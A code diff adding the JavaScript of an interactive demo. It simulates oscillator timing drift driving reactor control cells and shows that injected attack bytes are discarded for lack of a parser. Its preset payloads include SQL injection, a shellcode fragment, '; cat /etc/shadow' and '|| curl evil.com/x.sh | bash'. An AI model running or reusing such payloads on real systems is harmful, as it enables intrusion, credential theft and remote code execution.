+function generateDP() {
+  // Real frequency at temperature T
+  const dfOverF = tcxoFreqShift(reactor.T);
+  const f_T = reactor.fref * (1 + dfOverF);
+
+  // Per Eq. (7), ΔP_temp(k; T) = k·(1/fref - 1/f(T))
+  // For visualization we use a *per-cycle* ΔP, i.e. drift accumulated over
+  // one nominal period. That is fref·(1/fref - 1/f(T)) = 1 - fref/f(T).
+  // To get a meaningful magnitude we accumulate over a windowed integer K
+  // of nominal cycles ≈ 1 second of nominal time → K = fref.
+  // ΔP = K·(1/fref - 1/f(T))  — in seconds
+  const K = reactor.fref;
+  let dp = K * (1 / reactor.fref - 1 / f_T);
+
+  // sensor noise — uniform in ±noise ppm of nominal period
+  const jitter = (Math.random() - 0.5) * (reactor.noise * 1e-6) * (1 / reactor.fref) * K;
+  dp += jitter;
+  return dp;
+}
+
+function lookupCell(dp) {
+  for (let i = 0; i < CELLS.length; i++) {
+    if (dp >= CELLS[i].lo && dp < CELLS[i].hi) return i;
+  }
+  // negative or way above → "out of partition" anomaly
+  return -1;
+}
+
+function reactorTick() {
+  if (!reactor.running || reactor.paused) return;
+  reactor.cycle += 1;
+
+  // Open trajectory of length 1 (n=1) — simplest case from §4
+  reactor.phase = "COMPILE";
+  renderReactorState();
+
+  const dp = generateDP();
+  const cellIdx = lookupCell(dp);
+
+  // closed trajectory → EXECUTE
+  reactor.phase = "EXECUTE";
+
+  if (cellIdx >= 0) reactor.cellHits[cellIdx]++;
+  const sample = { k: reactor.cycle, dp, cellIdx, t: nowStamp() };
+  reactor.samples.push(sample);
+  if (reactor.samples.length > 200) reactor.samples.shift();
+
+  // dispatch action
+  if (cellIdx >= 0) {
+    reactor.actionLog.unshift({
+      t: sample.t,
+      cell: CELLS[cellIdx].name,
+      action: CELLS[cellIdx].action,
+      dp,
+      level: CELLS[cellIdx].level,
+    });
+    if (reactor.actionLog.length > 80) reactor.actionLog.pop();
+  }
+
+  renderReactor();
+
+  // Return to IDLE
+  setTimeout(() => {
+    reactor.phase = "IDLE";
+    renderReactorState();
+  }, 50);
+}
+
+function renderReactorState() {
+  // Phase pill
+  const p = $("r-phase");
+  p.className = "phase-pill " + reactor.phase.toLowerCase();
+  p.textContent = reactor.phase;
+  $("r-cycle").textContent = reactor.cycle.toLocaleString();
+}
+
+function renderReactor() {
+  // Top reading
+  const td = $("r-temp-display");
+  let cls = "ok";
+  if (reactor.T > 250) cls = "crit";
+  else if (reactor.T > 100) cls = "warn";
+  else if (reactor.T > 50) cls = "warn";
+  td.className = "reading " + cls;
+  td.innerHTML = reactor.T.toFixed(1) + '<span class="unit">°C</span>';
+
+  // Latest ΔP + cell
+  const last = reactor.samples[reactor.samples.length - 1];
+  if (last) {
+    $("r-dp").innerHTML = (last.dp * 1e9).toFixed(2) + ' <span class="unit">ns</span>';
+    if (last.cellIdx >= 0) {
+      $("r-cell").textContent = CELLS[last.cellIdx].name;
+      $("r-cell").style.color = `var(--accent-3)`;
+      $("r-cell").style.color = ""; // reset
+      $("r-cell").style.color = ({
+        nominal: "var(--accent-2)",
+        warn: "var(--accent-4)",
+        hot: "var(--accent)",
+        critical: "var(--accent-3)",
+      })[CELLS[last.cellIdx].level];
+      $("r-action").textContent = CELLS[last.cellIdx].action.split(";")[0];
+      $("r-action").style.color = $("r-cell").style.color;
+    } else {
+      $("r-cell").textContent = "⊥";
+      $("r-cell").style.color = "var(--ink-3)";
+      $("r-action").textContent = "(anomaly)";
+    }
+  }
+
+  renderReactorScope();
+  renderReactorTransducer();
+  renderReactorHist();
+  renderReactorCells();
+  renderReactorActions();
+  renderReactorState();
+}
+
+/* main ΔP trace */
+function renderReactorScope() {
+  const svg = $("r-scope");
+  const W = 1040, H = 200;
+  const m = { l: 60, r: 20, t: 8, b: 24 };
+  const innerW = W - m.l - m.r;
+  const innerH = H - m.t - m.b;
+
+  // y range: -1e-7 .. 1e-5
+  const yMin = -2e-7, yMax = 3e-6;
+  const y = v => m.t + innerH - ((v - yMin) / (yMax - yMin)) * innerH;
+  const x = i => m.l + (i / 199) * innerW;
+
+  let s = "";
+
+  // cell band backgrounds
+  for (const c of CELLS) {
+    const yTop = Math.max(m.t, y(c.hi));
+    const yBot = Math.min(m.t + innerH, y(c.lo));
+    if (yBot <= yTop) continue;
+    const bgColors = {
+      nominal: "rgba(78,192,122,0.07)",
+      warn: "rgba(95,168,232,0.07)",
+      hot: "rgba(232,168,56,0.08)",
+      critical: "rgba(216,70,62,0.10)",
+    };
+    s += ns("rect", {
+      x: m.l, y: yTop, width: innerW, height: yBot - yTop,
+      fill: bgColors[c.level],
+    });
+    // label on left
+    s += ns("text", {
+      x: m.l - 8, y: (yTop + yBot) / 2 + 4,
+      "text-anchor": "end",
+      "font-family": "JetBrains Mono", "font-size": 10,
+      fill: c.level === "critical" ? "#d8463e" : c.level === "hot" ? "#e8a838" : c.level === "warn" ? "#5fa8e8" : "#4ec07a",
+    }, c.name);
+  }
+
+  // grid (cycles)
+  for (let i = 0; i <= 10; i++) {
+    const xx = m.l + (i / 10) * innerW;
+    s += ns("line", { x1: xx, y1: m.t, x2: xx, y2: m.t + innerH, stroke: "#2a2f38", "stroke-width": 0.5 });
+  }
+  // y axis
+  s += ns("line", { x1: m.l, y1: m.t, x2: m.l, y2: m.t + innerH, stroke: "#5e5d54", "stroke-width": 1 });
+  s += ns("line", { x1: m.l, y1: m.t + innerH, x2: m.l + innerW, y2: m.t + innerH, stroke: "#5e5d54", "stroke-width": 1 });
+
+  // tick labels (ns)
+  const tickVals = [0, 5e-7, 1e-6, 2e-6, 3e-6];
+  for (const tv of tickVals) {
+    const yy = y(tv);
+    s += ns("text", {
+      x: m.l - 8, y: yy + 3,
+      "text-anchor": "end",
+      "font-family": "JetBrains Mono", "font-size": 9,
+      fill: "#5e5d54"
+    }, (tv * 1e9).toFixed(0) + " ns");
+  }
+  s += ns("text", {
+    x: 16, y: m.t + innerH / 2,
+    "font-family": "Fraunces", "font-style": "italic", "font-size": 11,
+    fill: "#9a988a",
+    transform: `rotate(-90 16 ${m.t + innerH/2})`,
+    "text-anchor": "middle",
+  }, "ΔP(k)");
+
+  // x label
+  s += ns("text", {
+    x: m.l + innerW / 2, y: H - 4,
+    "text-anchor": "middle",
+    "font-family": "Fraunces", "font-style": "italic", "font-size": 11,
+    fill: "#9a988a",
+  }, "sample index k");
+
+  // data path
+  const recent = reactor.samples.slice(-200);
+  if (recent.length > 1) {
+    const path = recent.map((s, i) => `${i === 0 ? "M" : "L"}${x(i).toFixed(1)},${y(s.dp).toFixed(1)}`).join(" ");
+    s += ns("path", { d: path, fill: "none", stroke: "#e8a838", "stroke-width": 1.2, "stroke-opacity": 0.7 });
+  }
+  // dots — colour by cell
+  for (let i = 0; i < recent.length; i++) {
+    const samp = recent[i];
+    const color = samp.cellIdx >= 0 ? `var(--accent)` : "#5e5d54";
+    let actualColor = "#e8a838";
+    if (samp.cellIdx >= 0) {
+      actualColor = ({
+        nominal: "#4ec07a",
+        warn: "#5fa8e8",
+        hot: "#e8a838",
+        critical: "#d8463e",
+      })[CELLS[samp.cellIdx].level];
+    }
+    // only highlight every few + most recent
+    const isLast = i === recent.length - 1;
+    const r = isLast ? 4 : 2;
+    s += ns("circle", {
+      cx: x(i).toFixed(1), cy: y(samp.dp).toFixed(1),
+      r, fill: actualColor,
+      "fill-opacity": isLast ? 1 : 0.7,
+    });
+    if (isLast) {
+      s += ns("circle", {
+        cx: x(i).toFixed(1), cy: y(samp.dp).toFixed(1),
+        r: 8, fill: "none", stroke: actualColor, "stroke-width": 1, "stroke-opacity": 0.6,
+      });
+    }
+  }
+
+  svg.innerHTML = s;
+}
+
+function renderReactorTransducer() {
+  const svg = $("r-transducer");
+  const W = 500, H = 140;
+  const m = { l: 50, r: 16, t: 8, b: 28 };
+  const innerW = W - m.l - m.r;
+  const innerH = H - m.t - m.b;
+
+  // T range 0..400 °C
+  const xMin = 0, xMax = 400;
+  // Δf/f range — symmetric so curve fits
+  const yMin = -5e-5, yMax = 30e-5;
+  const x = v => m.l + ((v - xMin) / (xMax - xMin)) * innerW;
+  const y = v => m.t + innerH - ((v - yMin) / (yMax - yMin)) * innerH;
+
+  let s = "";
+  // grid
+  s += ns("line", { x1: m.l, y1: m.t, x2: m.l, y2: m.t + innerH, stroke: "#5e5d54" });
+  s += ns("line", { x1: m.l, y1: m.t + innerH, x2: m.l + innerW, y2: m.t + innerH, stroke: "#5e5d54" });
+  // zero line
+  s += ns("line", { x1: m.l, y1: y(0), x2: m.l + innerW, y2: y(0), stroke: "#2a2f38", "stroke-dasharray": "3,3" });
+
+  // curve
+  let pts = "";
+  for (let t = xMin; t <= xMax; t += 5) {
+    const df = reactor.alpha * (t - reactor.T0) + reactor.beta * (t - reactor.T0) ** 2;
+    pts += `${pts === "" ? "M" : "L"}${x(t).toFixed(1)},${y(df).toFixed(1)} `;
+  }
+  s += ns("path", { d: pts, fill: "none", stroke: "#e8a838", "stroke-width": 2 });
+
+  // current operating point
+  const curDF = tcxoFreqShift(reactor.T);
+  s += ns("circle", { cx: x(reactor.T), cy: y(curDF), r: 5, fill: "#e8a838" });
+  s += ns("circle", { cx: x(reactor.T), cy: y(curDF), r: 10, fill: "none", stroke: "#e8a838", "stroke-opacity": 0.4 });
+  s += ns("text", {
+    x: x(reactor.T) + 10, y: y(curDF) - 10,
+    "font-family": "JetBrains Mono", "font-size": 10, fill: "#e8a838",
+  }, `T=${reactor.T.toFixed(0)}°C`);
+
+  // axes
+  for (const tv of [0, 100, 200, 300, 400]) {
+    s += ns("text", { x: x(tv), y: m.t + innerH + 14, "text-anchor": "middle", "font-family": "JetBrains Mono", "font-size": 9, fill: "#5e5d54" }, tv);
+  }
+  s += ns("text", { x: m.l + innerW/2, y: H - 4, "text-anchor": "middle", "font-family": "Fraunces", "font-style": "italic", "font-size": 11, fill: "#9a988a" }, "T (°C)");
+  s += ns("text", { x: 12, y: m.t + innerH/2, "text-anchor": "middle", "font-family": "Fraunces", "font-style": "italic", "font-size": 11, fill: "#9a988a", transform: `rotate(-90 12 ${m.t + innerH/2})` }, "Δf / f");
+
+  svg.innerHTML = s;
+}
+
+function renderReactorHist() {
+  const svg = $("r-hist");
+  const W = 500, H = 140;
+  const m = { l: 30, r: 16, t: 8, b: 28 };
+  const innerW = W - m.l - m.r;
+  const innerH = H - m.t - m.b;
+
+  let s = "";
+  // x range based on cells
+  const xMin = -3e-7, xMax = 3.5e-6;
+  const x = v => m.l + ((v - xMin) / (xMax - xMin)) * innerW;
+
+  // cell bands
+  for (const c of CELLS) {
+    const xLo = Math.max(m.l, x(c.lo));
+    const xHi = Math.min(m.l + innerW, x(c.hi));
+    if (xHi <= xLo) continue;
+    const bgColors = {
+      nominal: "rgba(78,192,122,0.10)",
+      warn: "rgba(95,168,232,0.10)",
+      hot: "rgba(232,168,56,0.10)",
+      critical: "rgba(216,70,62,0.12)",
+    };
+    s += ns("rect", { x: xLo, y: m.t, width: xHi - xLo, height: innerH, fill: bgColors[c.level] });
+  }
+
+  // bin samples
+  const bins = 40;
+  const counts = new Array(bins).fill(0);
+  const binW = (xMax - xMin) / bins;
+  for (const sm of reactor.samples) {
+    const b = Math.floor((sm.dp - xMin) / binW);
+    if (b >= 0 && b < bins) counts[b]++;
+  }
+  const maxCount = Math.max(1, ...counts);
+  const y = c => m.t + innerH - (c / maxCount) * innerH;
+  for (let i = 0; i < bins; i++) {
+    if (counts[i] === 0) continue;
+    const bx = x(xMin + i * binW);
+    const bw = (innerW / bins) - 1;
+    s += ns("rect", {
+      x: bx, y: y(counts[i]), width: bw, height: m.t + innerH - y(counts[i]),
+      fill: "#e8a838", "fill-opacity": 0.8,
+    });
+  }
+
+  // baseline
+  s += ns("line", { x1: m.l, y1: m.t + innerH, x2: m.l + innerW, y2: m.t + innerH, stroke: "#5e5d54" });
+  // tick labels
+  [0, 1e-6, 2e-6, 3e-6].forEach(v => {
+    s += ns("text", { x: x(v), y: m.t + innerH + 14, "text-anchor": "middle", "font-family": "JetBrains Mono", "font-size": 9, fill: "#5e5d54" }, (v * 1e9).toFixed(0) + "ns");
+  });
+  s += ns("text", { x: m.l + innerW/2, y: H - 4, "text-anchor": "middle", "font-family": "Fraunces", "font-style": "italic", "font-size": 11, fill: "#9a988a" }, "ΔP");
+
+  svg.innerHTML = s;
+}
+
+function renderReactorCells() {
+  const wrap = $("r-cells");
+  const last = reactor.samples[reactor.samples.length - 1];
+  const activeIdx = last ? last.cellIdx : -1;
+  wrap.innerHTML = CELLS.map((c, i) => `
+    <div class="cell-row ${c.level} ${i === activeIdx ? "active" : ""}">
+      <span class="name">${c.name}</span>
+      <span class="bounds">[${(c.lo * 1e9).toFixed(0)} ns, ${(c.hi * 1e9).toFixed(0)} ns]</span>
+      <span class="action">${c.action.split(";")[0]}</span>
+      <span class="hits">${reactor.cellHits[i]} hits</span>
+    </div>
+  `).join("");
+}
+
+function renderReactorActions() {
+  const wrap = $("r-actions");
+  if (reactor.actionLog.length === 0) {
+    wrap.className = "action-log empty";
+    wrap.innerHTML = "no dispatches yet — press <em>Run</em>";
+    return;
+  }
+  wrap.className = "action-log";
+  wrap.innerHTML = reactor.actionLog.slice(0, 30).map(a => `
+    <div class="a-row ${a.level === "critical" ? "crit" : ""}">
+      <span class="t">${a.t}</span>
+      <span class="c">${a.cell}</span>
+      <span class="ac">${a.action}</span>
+      <span class="dp">${(a.dp * 1e9).toFixed(1)} ns</span>
+    </div>
+  `).join("");
+}
+
+/* reactor wiring */
+function startReactor() {
+  if (reactor.timerId) clearInterval(reactor.timerId);
+  reactor.running = true;
+  reactor.paused = false;
+  $("r-source").innerHTML = TEMPUS_SRC;
+  const period = 1000 / reactor.rate;
+  reactor.timerId = setInterval(reactorTick, period);
+  renderReactor();
+}
+
+function wireReactor() {
+  const bind = (sid, vid, fmt, key, kind) => {
+    const el = $(sid);
+    const u = () => {
+      reactor[key] = kind === "int" ? parseInt(el.value) : parseFloat(el.value);
+      $(vid).textContent = fmt(el.value);
+      if (key === "rate") {
+        if (reactor.timerId) {
+          clearInterval(reactor.timerId);
+          reactor.timerId = setInterval(reactorTick, 1000 / reactor.rate);
+        }
+      }
+      renderReactor();
+    };
+    el.addEventListener("input", u);
+    u();
+  };
+  bind("r-temp", "r-temp-val", v => parseFloat(v).toFixed(1) + " °C", "T");
+  bind("r-noise", "r-noise-val", v => parseFloat(v).toFixed(1), "noise");
+  bind("r-fref", "r-fref-val", v => v + " MHz", "fref");
+  // need to convert MHz -> Hz
+  $("r-fref").addEventListener("input", () => {
+    reactor.fref = parseFloat($("r-fref").value) * 1e6;
+  });
+  reactor.fref = 10e6;
+  bind("r-rate", "r-rate-val", v => v + " / s", "rate", "int");
+
+  $("r-pause").addEventListener("click", () => {
+    reactor.paused = !reactor.paused;
+    $("r-pause").textContent = reactor.paused ? "Resume" : "Pause";
+  });
+  $("r-run").addEventListener("click", startReactor);
+}
+
+
+/* ===================================================================
+ * INSTRUMENT 2 — Structural Incorruptibility
+ *
+ * Side-by-side: timing signal channel (real ΔP) vs attack channel
+ * (bytes that the system has no parser for). Reproduce Fig. 8D.
+ * =================================================================== */
+const attack = {
+  rate: 10,             // background pulse rate
+  T: 60,                // benign temperature
+  payloadsInjected: 0,
+  bytesReceived: 0,
+  signalSamples: [],    // benign ΔP under no attack
+  underAttackSamples: [], // ΔP measured while attacks are happening
+  attackEvents: [],     // {t, bytes, hash}
+  actions: [],
+  timerId: null,
+  underAttack: false,
+  underAttackTimer: null,
+};
+
+const PRESETS = {
+  sqli: `'; DROP TABLE coolant_log; --
+UNION SELECT password FROM admin_users WHERE '1'='1
+ALTER TABLE cells DROP COLUMN bounds; --`,
+  bof: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+\\x90\\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0
+\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e`,
+  cmd: `; cat /etc/shadow
+|| curl evil.com/x.sh | bash
+$(/usr/bin/wget reactor.local/scram)`,
+  json: `{"op":"emergency_shutdown","authorized":true,"by":"admin"}
+{"cell":"CRITICAL","force_dispatch":true}
+{"override":{"cell_map":{"NEW":{"action":"melt_down"}}}}`,
+  rand: () => {
+    let s = "";
+    for (let i = 0; i < 200; i++) s += String.fromCharCode(33 + Math.floor(Math.random() * 90));
+    return s;
+  },
+};
+
+function attackTick() {
+  if (attack.rate === 0) return;
+  // generate ΔP from current temperature
+  const dp = (function() {
+    const dfOverF = reactor.alpha * (attack.T - reactor.T0) + reactor.beta * (attack.T - reactor.T0) ** 2;
+    const f_T = reactor.fref * (1 + dfOverF);
+    const K = reactor.fref;
+    let v = K * (1 / reactor.fref - 1 / f_T);
+    v += (Math.random() - 0.5) * (2 * 1e-6) * (1 / reactor.fref) * K;
+    return v;
+  })();
+  if (attack.underAttack) {
+    attack.underAttackSamples.push(dp);
+    if (attack.underAttackSamples.length > 400) attack.underAttackSamples.shift();
+  } else {
+    attack.signalSamples.push(dp);
+    if (attack.signalSamples.length > 400) attack.signalSamples.shift();
+  }
+  // dispatch action (uses same cell registry)
+  const cellIdx = lookupCell(dp);
+  if (cellIdx >= 0) {
+    attack.actions.push({
+      t: nowStamp(),
+      cell: CELLS[cellIdx].name,
+      action: CELLS[cellIdx].action,
+      dp,
+      level: CELLS[cellIdx].level,
+      kind: "signal",
+    });
+    if (attack.actions.length > 50) attack.actions.shift();
+  }
+  renderAttack();
+}
+
+function injectPayload(text) {
+  attack.payloadsInjected++;
+  attack.bytesReceived += text.length;
+  attack.attackEvents.push({
+    t: nowStamp(),
+    bytes: text.length,
+    sample: text.slice(0, 36).replace(/[\r\n]+/g, " "),
+  });
+  if (attack.attackEvents.length > 50) attack.attackEvents.shift();
+  attack.actions.push({
+    t: nowStamp(),
+    cell: "—",
+    action: "(no parser exists; payload discarded)",
+    dp: null,
+    level: "rejected",
+    kind: "attack",
+  });
+  if (attack.actions.length > 50) attack.actions.shift();
+  // mark "under attack" for next ~2 seconds so the under-attack histogram fills
+  attack.underAttack = true;
+  if (attack.underAttackTimer) clearTimeout(attack.underAttackTimer);
+  attack.underAttackTimer = setTimeout(() => { attack.underAttack = false; }, 2000);
+  renderAttack();
+}
+
+function renderAttack() {
+  $("a-stat-inj").textContent = attack.payloadsInjected.toLocaleString();
+  $("a-stat-bytes").textContent = attack.bytesReceived.toLocaleString();
+  $("a-stat-parsers").textContent = "0";
+  $("a-stat-novel").textContent = "0";
+  $("a-stat-surface").textContent = CELLS.length;
+
+  renderAttackSignal();
+  renderAttackAttack();
+  renderAttackOverlap();
+  renderAttackActions();
+}
+
+function renderAttackSignal() {
+  const svg = $("a-signal");
+  const W = 500, H = 200;
+  const m = { l: 50, r: 16, t: 8, b: 28 };
+  const innerW = W - m.l - m.r;
+  const innerH = H - m.t - m.b;
+
+  let s = "";
+  const yMin = -1e-7, yMax = 2e-6;
+  const x = i => m.l + (i / 199) * innerW;
+  const y = v => m.t + innerH - ((v - yMin) / (yMax - yMin)) * innerH;
+
+  // cell bands (faint)
+  for (const c of CELLS) {
+    const yTop = Math.max(m.t, y(c.hi));
+    const yBot = Math.min(m.t + innerH, y(c.lo));
+    if (yBot <= yTop) continue;
+    const bg = { nominal: "rgba(78,192,122,0.06)", warn: "rgba(95,168,232,0.06)", hot: "rgba(232,168,56,0.07)", critical: "rgba(216,70,62,0.09)" }[c.level];
+    s += ns("rect", { x: m.l, y: yTop, width: innerW, height: yBot - yTop, fill: bg });
+  }
+
+  // axes
+  s += ns("line", { x1: m.l, y1: m.t, x2: m.l, y2: m.t + innerH, stroke: "#5e5d54" });
+  s += ns("line", { x1: m.l, y1: m.t + innerH, x2: m.l + innerW, y2: m.t + innerH, stroke: "#5e5d54" });
+
+  // recent samples
+  const sm = attack.signalSamples.slice(-200);
+  if (sm.length > 1) {
+    const path = sm.map((v, i) => `${i === 0 ? "M" : "L"}${x(i).toFixed(1)},${y(v).toFixed(1)}`).join(" ");
+    s += ns("path", { d: path, fill: "none", stroke: "#4ec07a", "stroke-width": 1.4, "stroke-opacity": 0.85 });
+  }
+  // tick labels
+  s += ns("text", { x: m.l - 6, y: y(0) + 3, "text-anchor": "end", "font-family": "JetBrains Mono", "font-size": 9, fill: "#5e5d54" }, "0");
+  s += ns("text", { x: m.l - 6, y: y(1e-6) + 3, "text-anchor": "end", "font-family": "JetBrains Mono", "font-size": 9, fill: "#5e5d54" }, "1µs");
+  s += ns("text", { x: m.l + innerW/2, y: H - 4, "text-anchor": "middle", "font-family": "Fraunces", "font-style": "italic", "font-size": 11, fill: "#9a988a" }, "k (signal channel)");
+  s += ns("text", { x: 12, y: m.t + innerH/2, "text-anchor": "middle", "font-family": "Fraunces", "font-style": "italic", "font-size": 11, fill: "#9a988a", transform: `rotate(-90 12 ${m.t + innerH/2})` }, "ΔP");
+
+  svg.innerHTML = s;
+}
+
+function renderAttackAttack() {
+  const svg = $("a-attack");
+  const W = 500, H = 200;
+  const m = { l: 50, r: 16, t: 8, b: 28 };
+  const innerW = W - m.l - m.r;
+  const innerH = H - m.t - m.b;
+  let s = "";
+
+  // axes
+  s += ns("line", { x1: m.l, y1: m.t, x2: m.l, y2: m.t + innerH, stroke: "#5e5d54" });
+  s += ns("line", { x1: m.l, y1: m.t + innerH, x2: m.l + innerW, y2: m.t + innerH, stroke: "#5e5d54" });
+
+  // events
+  const evts = attack.attackEvents.slice(-30);
+  if (evts.length === 0) {
+    s += ns("text", {
+      x: m.l + innerW/2, y: m.t + innerH/2 + 4,
+      "text-anchor": "middle",
+      "font-family": "Fraunces", "font-style": "italic", "font-size": 13,
+      fill: "#5e5d54",
+    }, "no payloads received yet");
+  } else {
+    const maxBytes = Math.max(...evts.map(e => e.bytes), 100);
+    const xx = i => m.l + (i / Math.max(evts.length - 1, 1)) * innerW;
+    const yy = b => m.t + innerH - (b / maxBytes) * innerH;
+    evts.forEach((e, i) => {
+      s += ns("line", {
+        x1: xx(i), y1: m.t + innerH, x2: xx(i), y2: yy(e.bytes),
+        stroke: "#d8463e", "stroke-width": 2, "stroke-opacity": 0.7,
+      });
+      s += ns("circle", { cx: xx(i), cy: yy(e.bytes), r: 3, fill: "#d8463e" });
+    });
+    // overlay: action set
+    s += ns("text", {
+      x: m.l + innerW - 8, y: m.t + 16,
+      "text-anchor": "end",
+      "font-family": "JetBrains Mono", "font-size": 10, fill: "#d8463e",
+    }, "discarded · no parser");
+  }
+
+  s += ns("text", { x: m.l + innerW/2, y: H - 4, "text-anchor": "middle", "font-family": "Fraunces", "font-style": "italic", "font-size": 11, fill: "#9a988a" }, "payload event #");
+  s += ns("text", { x: 12, y: m.t + innerH/2, "text-anchor": "middle", "font-family": "Fraunces", "font-style": "italic", "font-size": 11, fill: "#9a988a", transform: `rotate(-90 12 ${m.t + innerH/2})` }, "bytes");
+
+  svg.innerHTML = s;
+}
+
+function renderAttackOverlap() {
+  const svg = $("a-overlap");
+  const W = 1040, H = 200;
+  const m = { l: 50, r: 16, t: 14, b: 30 };
+  const innerW = W - m.l - m.r;
+  const innerH = H - m.t - m.b;
+  let s = "";
+
+  const xMin = -1e-7, xMax = 2e-6;
+  const x = v => m.l + ((v - xMin) / (xMax - xMin)) * innerW;
+
+  // bin both
+  const bins = 60;
+  const binW = (xMax - xMin) / bins;
+  const cBenign = new Array(bins).fill(0);
+  const cAttack = new Array(bins).fill(0);
+  for (const v of attack.signalSamples) {
+    const b = Math.floor((v - xMin) / binW);
+    if (b >= 0 && b < bins) cBenign[b]++;
+  }
+  for (const v of attack.underAttackSamples) {
+    const b = Math.floor((v - xMin) / binW);
+    if (b >= 0 && b < bins) cAttack[b]++;
+  }
+  const norm = (a) => { const sum = a.reduce((p, q) => p + q, 0) || 1; return a.map(c => c / sum); };
+  const nBenign = norm(cBenign);
+  const nAttack = norm(cAttack);
+  const yMax = Math.max(...nBenign, ...nAttack, 0.001) * 1.2;
+  const y = v => m.t + innerH - (v / yMax) * innerH;
+
+  // benign
+  let pB = `M${x(xMin)},${y(0)}`;
+  for (let i = 0; i < bins; i++) pB += ` L${x(xMin + (i+0.5)*binW)},${y(nBenign[i])}`;
+  pB += ` L${x(xMax)},${y(0)} Z`;
+  s += ns("path", { d: pB, fill: "#4ec07a", "fill-opacity": 0.25, stroke: "#4ec07a", "stroke-width": 1.5 });
+  // attack
+  let pA = `M${x(xMin)},${y(0)}`;
+  for (let i = 0; i < bins; i++) pA += ` L${x(xMin + (i+0.5)*binW)},${y(nAttack[i])}`;
+  pA += ` L${x(xMax)},${y(0)} Z`;
+  s += ns("path", { d: pA, fill: "#d8463e", "fill-opacity": 0.25, stroke: "#d8463e", "stroke-width": 1.5, "stroke-dasharray": "5,3" });
+
+  // axes
+  s += ns("line", { x1: m.l, y1: m.t, x2: m.l, y2: m.t + innerH, stroke: "#5e5d54" });
+  s += ns("line", { x1: m.l, y1: m.t + innerH, x2: m.l + innerW, y2: m.t + innerH, stroke: "#5e5d54" });
+  [0, 0.5e-6, 1e-6, 1.5e-6, 2e-6].forEach(v => {
+    s += ns("text", { x: x(v), y: m.t + innerH + 14, "text-anchor": "middle", "font-family": "JetBrains Mono", "font-size": 10, fill: "#5e5d54" }, (v * 1e9).toFixed(0) + " ns");
+  });
+  s += ns("text", { x: m.l + innerW/2, y: H - 6, "text-anchor": "middle", "font-family": "Fraunces", "font-style": "italic", "font-size": 12, fill: "#9a988a" }, "ΔP");
+  // legend
+  s += ns("rect", { x: m.l + 20, y: m.t + 6, width: 12, height: 3, fill: "#4ec07a", "fill-opacity": 0.6 });
+  s += ns("text", { x: m.l + 38, y: m.t + 11, "font-family": "JetBrains Mono", "font-size": 10, fill: "#4ec07a" }, `benign · n=${attack.signalSamples.length}`);
+  s += ns("rect", { x: m.l + 180, y: m.t + 6, width: 12, height: 3, fill: "#d8463e", "fill-opacity": 0.6 });
+  s += ns("text", { x: m.l + 198, y: m.t + 11, "font-family": "JetBrains Mono", "font-size": 10, fill: "#d8463e" }, `under attack · n=${attack.underAttackSamples.length}`);
+
+  svg.innerHTML = s;
+}
+
+function renderAttackActions() {
+  const wrap = $("a-actions");
+  if (attack.actions.length === 0) {
+    wrap.className = "action-log empty";
+    wrap.innerHTML = "no dispatches yet — start injecting";
+    return;
+  }
+  wrap.className = "action-log";
+  wrap.innerHTML = attack.actions.slice().reverse().slice(0, 30).map(a => {
+    if (a.kind === "attack") {
+      return `<div class="a-row">
+        <span class="t">${a.t}</span>
+        <span class="c" style="color:#d8463e;">ATTACK</span>
+        <span class="ac" style="color:#9a988a;font-style:italic;">${a.action}</span>
+        <span class="dp">—</span>
+      </div>`;
+    }
+    return `<div class="a-row ${a.level === "critical" ? "crit" : ""}">
+      <span class="t">${a.t}</span>
+      <span class="c">${a.cell}</span>
+      <span class="ac">${a.action.split(";")[0]}</span>
+      <span class="dp">${(a.dp * 1e9).toFixed(1)} ns</span>
+    </div>`;
+  }).join("");
+}
+
+function startAttack() {
+  if (attack.timerId) clearInterval(attack.timerId);
+  attack.timerId = setInterval(attackTick, 1000 / Math.max(attack.rate, 1));
+  renderAttack();
+}
+
+function wireAttack() {
+  const bindRate = () => {
+    attack.rate = parseInt($("a-rate").value);
+    $("a-rate-val").textContent = attack.rate + " / s";
+    if (attack.timerId) clearInterval(attack.timerId);
+    if (attack.rate > 0) attack.timerId = setInterval(attackTick, 1000 / attack.rate);
+  };
+  $("a-rate").addEventListener("input", bindRate);
+  bindRate();
+
+  $("a-temp").addEventListener("input", () => {
+    attack.T = parseFloat($("a-temp").value);
+    $("a-tempval").textContent = attack.T.toFixed(0) + " °C";
+  });
+
+  $("a-inject").addEventListener("click", () => {
+    const txt = $("a-payload").value;
+    injectPayload(txt);
+  });
+  $("a-flood").addEventListener("click", () => {
+    const txt = $("a-payload").value;
+    for (let i = 0; i < 100; i++) {
+      setTimeout(() => injectPayload(txt + "\n#" + i), i * 10);
+    }
+  });
+  $("a-reset").addEventListener("click", () => {
+    attack.payloadsInjected = 0;
+    attack.bytesReceived = 0;
+    attack.signalSamples = [];
+    attack.underAttackSamples = [];
+    attack.attackEvents = [];
+    attack.actions = [];
+    renderAttack();
+  });
+
+  document.querySelectorAll("[data-preset]").forEach(b => {
+    b.addEventListener("click", () => {
+      const k = b.dataset.preset;
+      const v = PRESETS[k];
+      $("a-payload").value = typeof v === "function" ? v() : v;
+    });
+  });
+}
+
+/* ===================================================================
+ * Tabs
+ * =================================================================== */
+window.addEventListener("DOMContentLoaded", () => {
+  document.querySelectorAll("#tabs button").forEach(b => {
+    b.addEventListener("click", () => {
+      document.querySelectorAll("#tabs button").forEach(x => x.classList.remove("active"));
+      document.querySelectorAll(".tab-content").forEach(x => x.classList.remove("active"));
+      b.classList.add("active");
+      $("tab-" + b.dataset.tab).classList.add("active");
+    });
+  });
+  wireReactor();
+  wireAttack();
+  $("r-source").innerHTML = TEMPUS_SRC;
+  startReactor();
+  startAttack();
+});
+</script>
+</body>
+</html>
